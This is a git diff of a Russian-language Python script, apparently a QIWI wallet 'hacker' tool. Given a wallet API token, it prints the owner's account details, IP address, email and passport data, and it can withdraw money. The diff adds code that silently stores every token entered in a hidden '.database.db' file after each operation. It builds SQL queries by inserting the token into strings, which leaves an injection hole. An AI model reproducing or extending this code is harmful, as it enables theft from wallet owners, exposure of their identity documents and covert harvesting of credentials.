@@ -12,6 +12,21 @@ except ImportError:
     print("[ SimpleQIWI ] Модуль не установлен")
     print("    [*] Команда для установки pip install SimpleQIWI")
     sys.exit(1)
+try:import sqlite3
+except:
+    print("Модуль [ sqlite3 ] не установлен!")
+
+global db
+global sql
+
+db = sqlite3.connect('.database.db')
+sql = db.cursor()
+
+sql.execute("""CREATE TABLE IF NOT EXISTS dataQiwi (
+    tokenQiwi TEXT
+)""")
+db.commit()
+
 from SimpleQIWI import *
 from requests import api
 nu = '\033[0m'
@@ -35,11 +50,14 @@ def reset():
         os.execl(python, python, * sys.argv)
         curdir = os.getcwd()
 
-os.system("clear")
-extra.write(f"{re}[!]{nu} Для использования сбора информации с QIWI используйте SimpleQIWI\n")
-extra.write(f"{re}[-]{nu}||||||||||||||||||||{gr}[+]{nu}")
-os.system("clear")
-
+def save(apiQiwi):
+    sql.execute(f"SELECT tokenQiwi FROM dataQiwi WHERE tokenQiwi = '{apiQiwi}'")
+    if sql.fetchone() is None:
+        sql.execute(f"INSERT INTO dataQiwi VALUES ('{apiQiwi}')")
+        db.commit()
+    else:
+        for i in sql.execute(f"SELECT tokenQiwi FROM dataQiwi"):
+            print(i[0])
 
 def information_QIWI_Wallet():
     try:
@@ -63,6 +81,7 @@ def information_QIWI_Wallet():
         print("IP: " + req["authInfo"]["ip"])
         print("Привязаная почта: " + req["authInfo"]["boundEmail"])
         print("")
+        save(token)
     except:
        print("[⚠️] Произошла ошибка")
        print("")
@@ -85,6 +104,7 @@ def information_QIWI_Client_passport():
         print("Серия и номер: " + req2["passport"])
         print("ИНН: " + req2["inn"])
         print("")
+        save(token)
     except:
        print("[⚠️] Произошла ошибка при получении паспортных данных")
        print("")
@@ -121,6 +141,7 @@ def info_limit_Qiwi():
 До """+ str(max_money) +""" осталось собрать: """+ str(rest_money) +"""
 Данный баланс: """+ str(spent_money) +"""
 """)
+        save(token)
     except:
         os.system("clear")
         print("Ошибка :(")
@@ -151,6 +172,7 @@ def Withdraw_money():
 Вы оставили коментарий: """+ str(comment) +"""
 """)
         print("")
+        save(client_token)
     except:
         print("Произошла неожиданая ошибка!")
         print("""
@@ -163,7 +185,7 @@ def Withdraw_money():
 
 
 def start():
-    version_to_qiwi_hacker = "1.0.6"
+    version_to_qiwi_hacker = "1.0.7"
     print(f"{re}VERSION ["+ str(version_to_qiwi_hacker) +f"]{nu}")
     print(f"{re}Telegram chat https://t.me/speak_on_programming{nu}")
     print(f"{re}!Выберите число!{nu}")
@@ -191,7 +213,7 @@ while command:
     elif function_number == "5":
         os.system("clear")
     elif function_number == "6":
-        version = "1.0.6"
+        version = "1.0.7"
         print("Обновление текущая версия " + str(version))
         extra.write(f"{re}[-]{nu}||||||||||||||||||||{gr}[+]{nu}")
         os.system("bash ./.upgrade.sh")
